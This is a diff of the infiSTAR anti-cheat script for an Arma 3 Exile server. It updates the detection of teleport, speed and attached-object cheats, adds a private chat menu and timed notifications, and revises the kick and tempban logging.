-						_log = format['BadText on Chat: %1 [%2]',_txt,_x];
-						[_name,_puid,'SLOG',toArray(_log)] call _AHKickLog;
+						[_name,_puid,'VOTE',toArray 'NIGHT'] call _AHKickLog;
 					};
-				} forEach "+str _badChat+";
-				"; if(_VDN)then{ _A3AHstring = _A3AHstring + "
-				if((_txt select [0,8] isEqualTo 'vote day')||(_txt select [1,8] isEqualTo 'vote day'))then{
-					waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
-					[_name,_puid,'VOTE',toArray 'DAY'] call _AHKickLog;
-				};
-				if((_txt select [0,10] isEqualTo 'vote night')||(_txt select [1,10] isEqualTo 'vote night'))then{
-					waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
-					[_name,_puid,'VOTE',toArray 'NIGHT'] call _AHKickLog;
-				};
-				"; }; _A3AHstring = _A3AHstring + "
-				if(_txt isEqualTo '!chat')then{
-					waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
-					if(!isNil'fnc_chat_send')then{if(isNull (findDisplay -1340))then{createdialog 'infiSTAR_CHAT';};};
+					"; }; _A3AHstring = _A3AHstring + "
+					if(_txt isEqualTo '!chat')then{
+						waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};
+						if(!isNil'fnc_chat_send')then{if(isNull (findDisplay -1340))then{createdialog 'infiSTAR_CHAT';};};
+					};
 				};
 			};
 		};
@@ -1118,7 +1131,7 @@ _FN_INJECT_ON_CLIENT = {
 		"; }; _A3AHstring = _A3AHstring + "
 		onEachFrame {};
 	"; }; _A3AHstring = _A3AHstring + ""; if(!isNil'infiSTAR_DEBUG')then{ _A3AHstring = _A3AHstring + "[0,_coderun,'49'] call fn_log_debug;"; }; _A3AHstring = _A3AHstring + "
-		if((isNull _display49)&&(isNull _display24))then{uiSleep 0.2;};
+		if((isNull _display49)&&(isNull (findDisplay 24)))then{uiSleep 0.2;};
 		if(rating player < 999999)then{player addRating 9999999;};
 		if!(player getVariable["+str _variable1+",false])then{player setVariable["+str _variable1+",true,true];};
 	};
@@ -1226,9 +1239,12 @@ _FN_INJECT_ON_CLIENT = {
 						_waittimer = diag_tickTime+120;
 						waitUntil {((!isNull findDisplay 46 && !isNil 'ExileClientLoadedIn' && getPlayerUID player != '')||(diag_tickTime > _waittimer))};
 						uiSleep 1;
-						_log = format['Server PUID not equal to player PUID (%1 != %2) (kicked)',_puid,getPlayerUID player];
-						[_name,_puid,'SLOG_SKICK',toArray(_log)] call _AHKickLog;
-						[] call _AHKickOFF;
+						if!((str _puid) isEqualTo (str(getPlayerUID player)))then
+						{
+							_log = format['Server PUID not equal to player PUID (%1 != %2) (kicked)',_puid,getPlayerUID player];
+							[_name,_puid,'SLOG_SKICK',toArray(_log)] call _AHKickLog;
+							[] call _AHKickOFF;
+						};
 					};
 				};
 			}
@@ -1256,7 +1272,24 @@ _FN_INJECT_ON_CLIENT = {
 				"; }; _A3AHstring = _A3AHstring + "
 				_mapMenuLogged = false;
 				
-				"; if(!_KYLE_MODE)then{ _A3AHstring = _A3AHstring + "
+				_keyUpfnc = {
+					_keyCode = _this select 1;
+					_handle = false;
+					if(_keyCode in (actionKeys 'TacticalView'))exitWith{systemChat format['KeyBind: %1 -> TacticalView is not allowed',keyName _keyCode];true};
+					if(_keyCode in (actionKeys 'User3'))exitWith{if(!isNil'fnc_chat_send')then{if(isNull (findDisplay -1340))then{createdialog 'infiSTAR_CHAT';};};true};
+					if(_keyCode in (actionKeys 'User4'))exitWith{player playMoveNow 'AmovPercMstpSnonWnonDnon_exerciseKata';true};
+					if(_keyCode in (actionKeys 'User5'))exitWith{player playMoveNow 'AmovPercMstpSnonWnonDnon_exercisePushup';true};
+					_handle
+				};
+				(finddisplay 46) displayAddEventHandler ['KeyUp',_keyUpfnc];
+				_keyDownfnc = {
+					_keyCode = _this select 1;
+					_handle = false;
+					if(_keyCode in (actionKeys 'TacticalView'))exitWith{systemChat format['KeyBind: %1 -> TacticalView is not allowed',keyName _keyCode];true};
+					_handle
+				};
+				(finddisplay 46) displayAddEventHandler ['KeyDown',_keyDownfnc];
+			"; if(!_KYLE_MODE)then{ _A3AHstring = _A3AHstring + "
 				_vct = 5;
 				_vctd = diag_tickTime + 30;
 				_vctoo = diag_tickTime + 30;
@@ -1356,14 +1389,7 @@ _FN_INJECT_ON_CLIENT = {
 					_oldExileClientPlayerScore = ExileClientPlayerScore;
 					_firstchancePlayerScore = true;
 				"; }; _A3AHstring = _A3AHstring + "
-				"; }; _A3AHstring = _A3AHstring + "
-				
-				_startTime = diag_tickTime + 10;
-				if(_isNormal)then
-				{
-					(findDisplay 46) displayRemoveAllEventHandlers 'KeyDown';
-				};
-				(findDisplay 46) displayRemoveAllEventHandlers 'KeyUp';
+			"; }; _A3AHstring = _A3AHstring + "	
 				while{true}do{"; if(!isNil'infiSTAR_DEBUG')then{ _A3AHstring = _A3AHstring + "_coderun = diag_tickTime;"; }; _A3AHstring = _A3AHstring + "call (_this select 6);};
 			}
 		]
@@ -1514,6 +1540,7 @@ _FN_INJECT_ON_CLIENT = {
 		_curVehicle = vehicle player;
 		_type = typeOf _curVehicle;
 		_curnetId = netId _curVehicle;
+		if(isTouchingGround player)then{_touchedground = true;};
 		if(_curnetId isEqualTo '0:0')then
 		{
 			_log = format['ANTI-TP FOUND LocalVehicle: %1 with netId 0:0 @%2',_type,getPosATL _curVehicle];
@@ -1532,8 +1559,8 @@ _FN_INJECT_ON_CLIENT = {
 				{
 					if(_firstpos isEqualTo [])exitWith{_firstpos = _curpos;};
 					if(_firstpos distance2D _curpos < 10)exitWith{};
-					_exitHere = false;
 					
+					_exitHere = false;
 					_ropeAttachedToObj = ropeAttachedTo _curVehicle;
 					if(!isNull _ropeAttachedToObj)then
 					{
@@ -1567,17 +1594,21 @@ _FN_INJECT_ON_CLIENT = {
 							};
 						};
 					};
-					
 					if(_exitHere)exitWith{};
+					
+					_speed = round(abs(speed player));
 					_difftime = diag_tickTime - _lasttime;
-					_speed = (_distance / _difftime)*3.6;
+					_speedcalc = (_distance / _difftime)*3.6;
+					_speedcalc = _speedcalc max _speed;
+					
 					_topSpeedcalcOLD = _topSpeedcalc;
 					_topSpeed = (getNumber(configFile >> 'CfgVehicles' >> _type >> 'maxSpeed')) max 20;
 					_topSpeedcalc = _topSpeed * 1.8;
+					
 					if(isNull _oldVehicle)then{_topSpeedcalcOLD = _topSpeedcalc;};
-					if(_speed > _topSpeedcalc)then
+					if(_speedcalc > _topSpeedcalc)then
 					{
-						if(_speed > _topSpeedcalcOLD)then
+						if(_speedcalc > _topSpeedcalcOLD)then
 						{
 							_inTrader = call _fn_inTradeZone;
 							if(!_inTrader)then
@@ -1585,16 +1616,21 @@ _FN_INJECT_ON_CLIENT = {
 								_driver = driver _curVehicle;
 								if(player isEqualTo _driver)then
 								{
+									if(!_touchedground)then{
 									"; if((getNumber(configFile >> 'CfgSettings' >> 'BambiSettings' >> 'parachuteSpawning')) isEqualTo 1)then{ _A3AHstring = _A3AHstring + "
-									if((_speed < (_topSpeed * 5))&&(!isTouchingGround player)&&!(player isEqualTo _curVehicle))exitWith{};
+									if((_speedcalc < 301)&&(!isTouchingGround player)&&(_curVehicle isKindOf 'ParachuteBase'))exitWith{};
 									"; }; _A3AHstring = _A3AHstring + "
-									if((_type isEqualTo 'Exile_Bike_MountainBike')&&(_speed < (_topSpeed * 5))&&(abs(speed _curVehicle) > 10))exitWith{};
+									"; if((getNumber(configFile >> 'CfgSettings' >> 'BambiSettings' >> 'haloJump')) isEqualTo 1)then{ _A3AHstring = _A3AHstring + "
+									if((_speedcalc < 55)&&(!isTouchingGround player)&&(player isEqualTo _curVehicle))exitWith{};
+									"; }; _A3AHstring = _A3AHstring + "
+									};
+									if((_speedcalc < 100)&&(_type isEqualTo 'Exile_Bike_MountainBike'))exitWith{};
 									
 									if(_distance > 30)then
 									{
 										_log = format[
 											'POTENTIAL-TP-REVERTED#1: Moved %1m in %2s (from %3 to %4). TopSpeed of %5 is %6 speed was %7. Player FPS: %8. Alive for %9s - %10',
-											round _distance,_difftime,_lastpos,_curpos,_type,_topSpeed,_speed,diag_fps,diag_tickTime - _livestarted,if(_inTrader)then{'In Trader!'}else{''}	
+											round _distance,_difftime,_lastpos,_curpos,_type,_topSpeed,_speedcalc,diag_fps,diag_tickTime - _livestarted,if(_inTrader)then{'In Trader!'}else{''}	
 										];
 										[_name,_puid,'ANTI_TP',toArray(_log)] call _AHKickLog;
 									};
@@ -1611,7 +1647,7 @@ _FN_INJECT_ON_CLIENT = {
 										{
 											_log = format[
 												'POTENTIAL-TP-REVERTED#2: Moved %1m in %2s (from %3 to %4). TopSpeed of %5 is %6 speed was %7. Player FPS: %8. %9',
-												round _distance,_difftime,_lastpos,_curpos,_type,_topSpeed,_speed,diag_fps,if(_inTrader)then{'In Trader!'}else{''}
+												round _distance,_difftime,_lastpos,_curpos,_type,_topSpeed,_speedcalc,diag_fps,if(_inTrader)then{'In Trader!'}else{''}
 											];
 											[_name,_puid,'ANTI_TP',toArray(_log)] call _AHKickLog;
 											player setPosATL _lastpos;
@@ -1635,7 +1671,7 @@ _FN_INJECT_ON_CLIENT = {
 											
 											_log = format[
 												'TP with AI as driver..  Moved %1m in %2s (from %3 to %4). TopSpeed of %5 is %6 speed was %7. Player FPS: %8.',
-												round _distance,_difftime,_lastpos,_curpos,_type,_topSpeed,_speed,diag_fps
+												round _distance,_difftime,_lastpos,_curpos,_type,_topSpeed,_speedcalc,diag_fps
 											];
 											[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
 											[] call _AHKickOFF;
@@ -1679,7 +1715,7 @@ _FN_INJECT_ON_CLIENT = {
 		};
 		_lasttime = diag_tickTime;
 		_oldVehicle = _curVehicle;"; if(!isNil'infiSTAR_DEBUG')then{ _A3AHstring = _A3AHstring + "[2,_coderun,'ATcode'] call fn_log_debug;"; }; _A3AHstring = _A3AHstring + "
-		uiSleep .25;
+		uiSleep 0.3;
 	};
 	"; }; _A3AHstring = _A3AHstring + "
 	_iddchecks = {
@@ -1880,7 +1916,7 @@ _FN_INJECT_ON_CLIENT = {
 				};
 			};
 		} forEach allDisplays;
-		
+		"; if(_check_Notifications)then{ _A3AHstring = _A3AHstring + "
 		if(!isNil 'BIS_fnc_showNotification_queue')then
 		{
 			if(typeName BIS_fnc_showNotification_queue isEqualTo 'ARRAY')then
@@ -1916,7 +1952,7 @@ _FN_INJECT_ON_CLIENT = {
 				[] call _AHKickOFF;
 			};
 		};
-		
+		"; }; _A3AHstring = _A3AHstring + "
 		_uiNamespace_dynamicText = uiNamespace getVariable 'BIS_dynamicText';
 		if(!isNil '_uiNamespace_dynamicText')then
 		{
@@ -2101,7 +2137,6 @@ _FN_INJECT_ON_CLIENT = {
 				};
 			"; }; _A3AHstring = _A3AHstring + "
 		};
-		"; if(_attach_to_check)then{ _A3AHstring = _A3AHstring + "
 		
 		{
 			_obj = agent _x;
@@ -2119,41 +2154,43 @@ _FN_INJECT_ON_CLIENT = {
 				};
 			};
 		} forEach agents;
-		
+		"; if(_attach_to_check)then{ _A3AHstring = _A3AHstring + "
 		if(diag_tickTime > _checkedclose)then
 		{
 			_checkedclose = diag_tickTime + 10;
+			_veh = vehicle player;
 			_closeveh = [_veh];
 			_closeveh append (_veh nearEntities ['AllVehicles',100]);
 			{
 				if(!isNull _x)then
 				{
 					_xobj = _x;
-					_attcheXdobjects = attachedObjects _x;
-					if!(_attcheXdobjects isEqualTo [])then
+					if(!isNull _xobj)then
 					{
-						_cntQd = {(toLower (typeOf _x)) find 'quad' != -1} count _attcheXdobjects;
-						if(_cntQd > 5)then
+						_attcheXdobjects = attachedObjects _x;
+						if!(_attcheXdobjects isEqualTo [])then
 						{
-							detach _xobj;
-							{detach _x;} forEach _attcheXdobjects;
-							if(_xobj isEqualTo _veh)then
+							_cntQd = {(toLower (typeOf _x)) find 'quad' != -1} count _attcheXdobjects;
+							if(_cntQd > 5)then
 							{
-								_log = format['AttachTo Hack @%1 %2',position _xobj,mapGridPosition _xobj];
-								[_name,_puid,'BAN',toArray(_log)] call _AHKickLog;
-								[] call _AHKickOFF;
-							}
-							else
-							{
-								_log = format['Attached Objects found @%1 %2  Hack?!',position _xobj,mapGridPosition _xobj];
-								[_name,_puid,'HLOG',toArray(_log)] call _AHKickLog;
+								detach _xobj;
+								{detach _x;} forEach _attcheXdobjects;
+								if(_xobj isEqualTo _veh)then
+								{
+									_log = format['x attached to vehicle player: %1 - %2   @%3 %4',typeOf _xobj,_attcheXdobjects,position player,mapGridPosition player];
+									[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
+									[] call _AHKickOFF;
+								}
+								else
+								{
+									_log = format['Attached Objects found: %1 - %2    @%3 %4',typeOf _xobj,_attcheXdobjects,position _xobj,mapGridPosition _xobj];
+									[_name,_puid,'HLOG',toArray(_log)] call _AHKickLog;
+								};
 							};
-						};
-						if(alive _veh)then
-						{
 							if(_veh in _attcheXdobjects)then
 							{
-								_log = format['AttachTo Hack: %1   @%2 %3',name _xobj,position player,mapGridPosition player];
+								detach _veh;
+								_log = format['vehicle player attached to x: %1 - %2   @%3 %4',typeOf _xobj,_attcheXdobjects,position player,mapGridPosition player];
 								[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
 								[] call _AHKickOFF;
 							};
@@ -2230,12 +2267,12 @@ _FN_INJECT_ON_CLIENT = {
 		"; }; _A3AHstring = _A3AHstring + "
 		"; if(_checkHiddenObjects)then{ _A3AHstring = _A3AHstring + "
 		_pos = getPos player;
-		_objects = nearestObjects [_pos, ['Building','Exile_Construction_Abstract_Static','AbstractConstruction','Exile_Construction_Flag_Static'], 250];
+		_objects = nearestObjects [_pos, ['Exile_Construction_Abstract_Static','AbstractConstruction','Exile_Construction_Flag_Static'], 250];
 		{
 			if(isObjectHidden _x)then
 			{
 				_log = format['Invisible OBJECT: %1 @%2 %3',typeOf _x,getPos _x,mapGridPosition _x];
-				[_name,_puid,'BAN',toArray(_log)] call _AHKickLog;
+				[_name,_puid,'HLOG_SKICK',toArray(_log)] call _AHKickLog;
 				[] call _AHKickOFF;
 			};
 		} forEach _objects;
@@ -2336,7 +2373,7 @@ _FN_INJECT_ON_CLIENT = {
 		_bigInputArray pushBack [
 			[_name,_uid,_AHKickOFF,_AHKickLog,_atLoopCode],
 			{
-				private['_name','_puid','_AHKickOFF','_AHKickLog','_fn_set_reset','_lastpos','_log','_lasttime','_difftime','_curpos','_firstpos','_driver','_curnetId','_type','_allowTP','_fn_inTradeZone','_inTrader','_curVehicle','_oldVehicle','_distance','_speed','_topSpeed','_topSpeedcalc','_topSpeedcalcOLD','_livestarted'];
+				private['_name','_puid','_AHKickOFF','_AHKickLog','_fn_set_reset','_lastpos','_log','_lasttime','_difftime','_curpos','_firstpos','_driver','_curnetId','_type','_allowTP','_fn_inTradeZone','_inTrader','_curVehicle','_oldVehicle','_distance','_speedcalc','_speed','_topSpeed','_topSpeedcalc','_topSpeedcalcOLD','_livestarted'];
 				_name = _this select 0;
 				_puid = _this select 1;
 				_AHKickOFF = _this select 2;
@@ -2369,6 +2406,7 @@ _FN_INJECT_ON_CLIENT = {
 				_type = typeOf _curVehicle;
 				uiNameSpace setVariable['"+_AHpos+"',[]];
 				_livestarted = diag_tickTime;
+				_touchedground = false;
 				while{true}do{"; if(!isNil'infiSTAR_DEBUG')then{ _A3AHstring = _A3AHstring + "_coderun = diag_tickTime;"; }; _A3AHstring = _A3AHstring + "call (_this select 4);};
 			}
 		];
@@ -2483,7 +2521,7 @@ _FN_INJECT_ON_CLIENT = {
 				format['%1h %2min %3s',_hours,_minutes,round _seconds]
 			};
 			if(isNil'VERSIONCHECKRESULT')then{VERSIONCHECKRESULT='';};
-			_devLog = format['infiSTAR.de AHAT %1 - 07-Mar-2016 04-06-16 - v0038 - server running: %2:921 - AdminNameTag: "+str _AdminNameTag+"',VERSIONCHECKRESULT,call _GET_TIME_TIME];diag_log _devLog;
+			_devLog = format['infiSTAR.de AHAT %1 - 03-Apr-2016 23-22-35 - v0044 - server running: %2:2111 - AdminNameTag: "+str _AdminNameTag+"',VERSIONCHECKRESULT,call _GET_TIME_TIME];diag_log _devLog;
 			"; if(!_HIDE_FROM_PLAYERS)then{ _A3AHstring = _A3AHstring + "
 				systemChat format['<infiSTAR.de> %1 - Successfully Loaded In.',call _GET_TIME_TIME];
 			"; }; _A3AHstring = _A3AHstring + "
@@ -2500,8 +2538,7 @@ _FN_INJECT_ON_CLIENT = {
 			"; if(_SVD != -1)then{ _A3AHstring = _A3AHstring + "
 				setObjectViewDistance [getObjectViewDistance select 0,"+str _SVD+"];
 			"; }; _A3AHstring = _A3AHstring + "
-			player createDiaryRecord ['Diary', ['[GG] Ghostz Gamerz', '<br/>  Visit Our Website @ <br/><br/>http://www.ghostzgamerz.com<br/><br/>']];
-			_bis_fnc_diagkey = uiNamespace getVariable['bis_fnc_diagkey',{false}];
+			player createDiaryRecord ['Diary', ['[GG] Ghostz Gamerz', '<br/>  Visit Our Website @ <br/><br/>http://www.ghostzgamerz.com<br/><br/>']];			_bis_fnc_diagkey = uiNamespace getVariable['bis_fnc_diagkey',{false}];
 			if(!isNil'_bis_fnc_diagkey')then{if!((str _bis_fnc_diagkey) in ['{false}','{}'])then{bis_fnc_diagkeychanged='bis_fnc_diagkeychanged';publicVariableServer'bis_fnc_diagkeychanged';};};
 			"+_AH_RunCheckENDVAR+" = time;
 		}
@@ -2561,7 +2598,231 @@ _FN_INJECT_ON_CLIENT = {
 		}
 	];
 	"; }; _A3AHstring = _A3AHstring + "
-	
+	"; if(_ENABLE_PRIVATE_CHAT_MENU)then{ _A3AHstring = _A3AHstring + "
+	_bigInputArray pushBack
+	[
+		{
+			if(isNil'CHAT_HISTORY_ARRAY')then{CHAT_HISTORY_ARRAY=[];};
+			if(isNil'ACTIVE_CHATS')then{ACTIVE_CHATS=[];};
+			CALC_TIME = {
+				_hours = floor(time / 60 / 60);
+				_minutes = floor((((time / 60 / 60) - _hours) max 0.0001)*60);
+				_seconds = time - (_hours*60*60) - (_minutes * 60);
+				format['%1h %2min %3s',_hours,_minutes,round _seconds]
+			};
+			['CALC_TIME',[CALC_TIME] call fnc_CompilableString] call FN_infiSTAR_F;
+			fnc_add_to_playerlist = {
+				_name = _unit getVariable['ExileName',name _unit];
+				_index = _chat_playerlist lbadd _name;
+				_chat_playerlist lbSetData [_index,netId _unit];
+				
+				_squadParams = squadParams _unit;
+				if!(_squadParams isEqualTo [])then
+				{
+					_squadinfo = _squadParams select 0;
+					_squadpic = _squadinfo select 4;
+					if!(_squadpic isEqualTo '')then
+					{
+						_chat_playerlist lbSetPicture [_index,_squadpic];
+						_chat_playerlist lbSetPictureColor [_index,[1, 1, 1, 1]];
+					};
+				};
+			};
+			['fnc_add_to_playerlist',[fnc_add_to_playerlist] call fnc_CompilableString] call FN_infiSTAR_F;
+			fnc_fill_chat_playerlist = {
+				disableSerialization;
+				_chat_playerlist = uiNamespace getVariable ['chat_playerlist', controlNull];
+				lbClear _chat_playerlist;
+				ACTIVE_CHATS = ACTIVE_CHATS - [objNull];
+				if!(ACTIVE_CHATS isEqualTo [])then
+				{
+					{
+						_unit = _x;
+						call fnc_add_to_playerlist;
+					} forEach ACTIVE_CHATS;
+					_index = _chat_playerlist lbadd '----------------------------------------------------------------------------------------------------';
+				};
+				
+				_players = allPlayers;
+				{_players set [_forEachIndex, [_x getVariable['ExileName',name _x], _x]];} forEach _players;
+				_players sort true;
+				{
+					_unit = _x select 1;
+					if!(_unit isEqualTo player)then
+					{
+						if(_unit in ACTIVE_CHATS)exitWith{};
+						call fnc_add_to_playerlist;
+					};
+				} forEach _players;
+			};
+			['fnc_fill_chat_playerlist',[fnc_fill_chat_playerlist] call fnc_CompilableString] call FN_infiSTAR_F;
+			fnc_fill_chat_history = {
+				disableSerialization;
+				
+				_chat_playerlist = uiNamespace getVariable ['chat_playerlist', controlNull];
+				_curselection = lbCurSel _chat_playerlist;
+				_receiverName = _chat_playerlist lbText _curselection;
+				
+				_chat_msgbox = uiNamespace getVariable ['chat_msgbox', controlNull];
+				lbClear _chat_msgbox;
+				if!(CHAT_HISTORY_ARRAY isEqualTo [])then
+				{
+					{
+						_senderName = _x select 0;
+						_receiverNameR = _x select 1;
+						
+						if(_receiverName in [_senderName,_receiverNameR])then
+						{
+							_time = _x select 2;
+							_text = _x select 3;
+							
+							_pretxt = format['%1 (%2): ',_senderName,_time];
+							
+							_index = 0;
+							_textsize = count _text;
+							_maxtsize = 165-(count _pretxt);
+							if(_textsize > _maxtsize)then
+							{
+								_partcount = ceil(_textsize / _maxtsize);
+								
+								_first = 0;
+								_index = _chat_msgbox lbAdd format['%1%2',_pretxt,_text select [_first,_maxtsize]];
+								for '_i' from 1 to (_partcount) do
+								{
+									_first = _maxtsize*_i;
+									_curtxt = _text select [_first,_maxtsize];
+									if(_curtxt != '')then
+									{
+										_index = _chat_msgbox lbAdd _curtxt;
+									};
+								};
+							}
+							else
+							{
+								_index = _chat_msgbox lbAdd format['%1%2',_pretxt,_text];
+							};
+							if(_senderName isEqualTo (name player))then{_chat_msgbox lbSetColor [_index,[0,0.8,1,1]];};
+							_chat_msgbox lbSetCurSel _index;
+							_chat_msgbox lbSetCurSel -1;
+						};
+					} forEach CHAT_HISTORY_ARRAY;
+				};
+			};
+			['fnc_fill_chat_history',[fnc_fill_chat_history] call fnc_CompilableString] call FN_infiSTAR_F;
+			fnc_chat_send = {
+				disableSerialization;
+				_chat_playerlist = uiNamespace getVariable ['chat_playerlist', controlNull];
+				_curselection = lbCurSel _chat_playerlist;
+				_receiverName = _chat_playerlist lbText _curselection;
+				
+				_stop = true;
+				{if((_x getVariable['ExileName',name _x]) isEqualTo _receiverName)exitWith{_stop = false;};} forEach allPlayers;
+				if(_stop)exitWith{systemChat '<infiSTAR.de> the player you want to message is not connected (maybe in lobby)'};
+				
+				_senderName = name player;
+				if(_receiverName isEqualTo '')exitWith{systemChat '<infiSTAR.de> select a player on the left that you want to write a message!'};
+				if(_receiverName isEqualTo _senderName)exitWith{systemChat '<infiSTAR.de> you can not write yourself a message..'};
+				_receiverNetId = _chat_playerlist lbData _curselection;
+				
+				_chat_inputfield = uiNamespace getVariable ['chat_inputfield', controlNull];
+				_text = ctrlText _chat_inputfield;
+				if(_text isEqualTo '')exitWith{systemChat '<infiSTAR.de> Please enter a Text!'};
+				_chat_inputfield ctrlSetText '';
+				
+				_time = call CALC_TIME;
+				[3,[4,[netId player,_receiverNetId,_time,_text]]] call FN_infiSTAR_CS;
+				CHAT_HISTORY_ARRAY pushBack [_senderName,_receiverName,_time,_text];
+				
+				_receiverObj = (objectFromNetId _receiverNetId);
+				ACTIVE_CHATS = ACTIVE_CHATS - [_receiverObj];
+				ACTIVE_CHATS pushBackUnique _receiverObj;
+				
+				playsound 'AddItemOK';
+				call fnc_fill_chat_history;
+			};
+			['fnc_chat_send',[fnc_chat_send] call fnc_CompilableString] call FN_infiSTAR_F;
+			fnc_chat_onLBSelChanged = {
+				disableSerialization;
+				call fnc_fill_chat_history;
+				_chat_text1 = uiNamespace getVariable ['chat_text1', controlNull];
+				
+				_chat_playerlist = uiNamespace getVariable ['chat_playerlist', controlNull];
+				_curselection = lbCurSel _chat_playerlist;
+				_receiverName = _chat_playerlist lbText _curselection;
+				
+				_chat_text1 ctrlSetText format['Chatpartner: %1',_receiverName];
+			};
+			['fnc_chat_onLBSelChanged',[fnc_chat_onLBSelChanged] call fnc_CompilableString] call FN_infiSTAR_F;
+			fnc_chat_onKeyDown = {
+				_key = _this select 1;
+				_return = false;
+				if(_key in [0x1C,0x9C])then
+				{
+					call fnc_chat_send;
+					_return = true;
+				};
+				_return
+			};
+			['fnc_chat_onKeyDown',[fnc_chat_onKeyDown] call fnc_CompilableString] call FN_infiSTAR_F;
+		},
+		{
+			call _this
+		}
+	];
+	"; }; _A3AHstring = _A3AHstring + "
+	"; if(_ENABLE_NOTIFICATION_MESSAGES)then{ _A3AHstring = _A3AHstring + "
+	_bigInputArray pushBack
+	[
+		{
+			[] spawn {
+				waitUntil {!isNil 'ExileSystemThreadSleep'};
+				{_x set [0,(_x select 0)*60];_x set [1,(_x select 1)*60];} forEach NOTIFY_MSG_ARRAY;
+				LAST_NOTIFICATION_SHOWN = 0;
+				_code = {
+					_curtime = time;
+					{
+						if(_curtime > LAST_NOTIFICATION_SHOWN)then
+						{
+							ctrlDelete ((findDisplay 46) displayCtrl 117997);
+							if!(_x isEqualTo [])then
+							{
+								_timetostart = _x select 0;
+								if(_curtime > _timetostart)then
+								{
+									if((_curtime - 135 < _timetostart)||(_timetostart isEqualTo -60))then
+									{
+										LAST_NOTIFICATION_SHOWN = _curtime + (_x select 2);
+										ctrlDelete ((findDisplay 46) displayCtrl 117997);
+										_ctrl = (findDisplay 46) ctrlCreate['RscStructuredText', 117997];
+										_ctrl ctrlSetPosition [_x select 4,_x select 5,1,1];
+										_ctrl ctrlSetScale 2;
+										_ctrl ctrlCommit 0;
+										_ctrl ctrlSetStructuredText parseText format['<t size=''%1'' color=''%2'' align=''left''>%3</t>',_x select 3,_x select 6,_x select 7];
+										
+										if(_timetostart isEqualTo -60)then
+										{
+											NOTIFY_MSG_ARRAY set [_forEachIndex,[]];
+										}
+										else
+										{
+											_selection = _x;
+											_selection set [0,_curtime + (_x select 1)];
+											NOTIFY_MSG_ARRAY set [_forEachIndex,_selection];
+										};
+									};
+								};
+							};
+						};
+					} forEach NOTIFY_MSG_ARRAY;
+				};
+				msgthreadid = [1, _code, [], true] call ExileClient_system_thread_addtask;
+			};
+		},
+		{
+			call _this
+		}
+	];
+	"; }; _A3AHstring = _A3AHstring + "
 	[
 		_bigInputArray,
 		{
@@ -2621,29 +2882,18 @@ FNC_INFISERVERKICK = compileFinal ""
 		_log = format['can not kick %1(%2) %3 - no Name / no UID / no ownerID',_name,_uid,_owner];
 		['KICKLOG',_log] call FNC_A3_CUSTOMLOG;
 	};
+	if(_owner isEqualTo -10)then{_owner = _uid call FNC_OWNER_BY_UID;};
 	_return = (call FN_GET_SERVERPW) serverCommand format ['#kick %1',_uid];
-	if(!_return)then
-	{
-		if(_owner > 2)then
-		{
-			[
-				[_name,_uid],
-				{diag_log '<infiSTAR.de> kicked to lobby #1';(findDisplay 46)closeDisplay 0;},
-				_owner,
-				false
-			] call FN_infiSTAR_S;
-		}
-		else
-		{
-			[
-				[_name,_uid],
-				{if((name player == (_this select 0))||(getPlayerUID player == (_this select 1)))then{diag_log '<infiSTAR.de> kicked to lobby #1';(findDisplay 46)closeDisplay 0;};},
-				-2,
-				false
-			] call FN_infiSTAR_S;
-		};
+	if(!_return)then{
+		[
+			[_name,_uid],
+			{if((name player == (_this select 0))||(getPlayerUID player == (_this select 1)))then{diag_log '<infiSTAR.de> kicked to lobby #1';(findDisplay 46)closeDisplay 0;};},
+			if(_owner > 2)then{_owner}else{-2},
+			false
+		] call FN_infiSTAR_S;
 	};
-	_log = format['%1(%2) ID: %3',_name,_uid,_owner];
+	_reason = if(count _this isEqualTo 4)then{format[' - %1',_this select 3]}else{''};
+	_log = format['%1(%2) ID: %3%4',_name,_uid,_owner,_reason];
 	['KICKLOG',_log] call FNC_A3_CUSTOMLOG;
 "";
 FNC_A3_infiSTARTMPBAN = {
@@ -2656,35 +2906,46 @@ FNC_A3_infiSTARTMPBAN = {
 		{
 			if(_uid in _admins)exitWith
 			{
-				_mytime = call fnc_getserverTime;
-				_log = _mytime + format['%1(%2) ADMIN - would have been tempbanned now!',_name,_uid];
-				_log call FNC_A3_HACKLOG;
+				_log = format['%1(%2) PLAYER IS ADMIN - STOPPED TEMPBAN FOR: %3',_name,_uid,_reason];
+				diag_log _log;
 			};
 			"+_TMPBAN+" pushBack _uid;
 			PVAH_AHTMPBAN = "+_TMPBAN+";'PVAH_AHTMPBAN' call fnc_variable_to_admins;
+			
+			_log = format['TEMPBANNED | %1(%2)',_name,_uid];if!(_reason isEqualTo '')then{_log = (_log + ' ' + _reason)};
+			['TEMPBANLOG',_log] call FNC_A3_CUSTOMLOG;
+			"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
+			if(count "+_AH_HackLogArrayRND+" > 99)then{"+_AH_HackLogArrayRND+" deleteAt 0;};
+			"+_AH_HackLogArrayRND+" pushBack _log;
+			'"+_AH_HackLogArrayRND+"' call fnc_variable_to_admins;
+			"; }; _A3AHstring = _A3AHstring + "
 		};
 	};
 	[_name,_uid,_owner] call FNC_INFISERVERKICK;
 };
 FNC_A3_infiSTARTMPBAN = compileFinal ([FNC_A3_infiSTARTMPBAN] call fnc_CompilableString);
-UPDATEEMAIL='psychotic_closure@hotmail.com';
-INFISTARVERSION='07-Mar-2016 04-06-16 - v0038';
+UPDATEEMAIL='gr8_boi52@yahoo.com';
+INFISTARVERSION='03-Apr-2016 23-22-35 - v0044';
